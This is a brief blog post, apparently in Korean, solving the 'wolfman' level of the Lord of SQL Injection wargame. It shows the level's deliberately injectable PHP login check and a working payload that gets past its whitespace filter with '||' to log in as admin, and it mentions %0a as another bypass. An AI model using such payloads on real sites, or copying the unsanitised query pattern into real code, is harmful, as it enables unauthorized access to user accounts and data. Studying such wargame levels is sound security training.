---
layout: post
title:  "los prob_wolfman"
date:   2019-08-23
excerpt: "Lord of Sql Injection"
tag:
- los
- sqli
- wargame
- webhacking
comments: true
---
> query : select id from prob_wolfman where id='guest' and pw=''

~~~ php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
~~~

# Solve

* 공백이 필터링 -> 우회 -> "\|\|" 사용
* 연산자 우선 순위 -> and > or 

### ?pw=noonzib'||id='admin

## WOLFMAN Clear!

> 문제 의도는 웬지 공백 우회를 '%0a'로 하는 것 같음 